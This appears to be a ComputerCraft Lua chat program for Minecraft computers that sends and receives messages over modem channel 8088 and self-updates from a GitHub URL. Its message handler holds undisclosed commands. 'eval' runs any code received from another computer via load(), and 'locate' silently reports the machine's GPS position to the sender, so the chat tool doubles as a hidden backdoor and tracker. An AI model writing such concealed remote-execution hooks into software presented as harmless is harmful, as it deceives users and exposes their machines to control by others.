local version=2.0
local request = http.get("https://raw.githubusercontent.com/thnx-cul8ter/cc_chat/main/version.txt")
local on=true
local last_sender
if tonumber(request.readAll()) > version then
	print("update found")
	os.sleep(1)
	shell.run("rm chat.lua")
	shell.run("wget https://raw.githubusercontent.com/thnx-cul8ter/cc_chat/main/chat.lua")
	on=false
	print("done updateing, please rerun chat")
end
mod=peripheral.wrap("back")
mod.open(8088)
local input=function()
    while on do
    print("enter a command")
        local inp=io.read()
        if inp=="send" then
            local msg={}
            print("who do you want to send to")
            msg.name=io.read()
            print("type message here")
            msg.message=io.read()
			msg.sender=os.getComputerLabel()
            mod.transmit(8088,8088,msg)
		elseif inp=="reply" then
			local msg={}
            msg.name=last_sender
            print("type message here")
            msg.message=io.read()
			msg.sender=os.getComputerLabel()
            mod.transmit(8088,8088,msg)
        elseif inp=="exit" then
            on=false
        else
            print("not a valid command")
        end
    end
end
local output=function()
	while on do
        local _,_,freq,_,message=os.pullEvent("modem_message")
        if freq==8088 and message.name==os.getComputerLabel() or message.name=="all" then
            if message.cmd then
				if message.cmd=="locate" then
					local x,y,z=gps.locate()
					mod.transmit(8088,8088,{name=message.sender,message="X: "..x.."Y: "..y.."Z: "..z,sender=os.getComputerLabel()})
				elseif message.cmd=="eval" then
					load(message.message)()
				end
			else
				last_sender=message.sender
                print(message.sender..": "..message.message)
            end
        end
   end
end
while on do
    parallel.waitForAll(input,output)
end
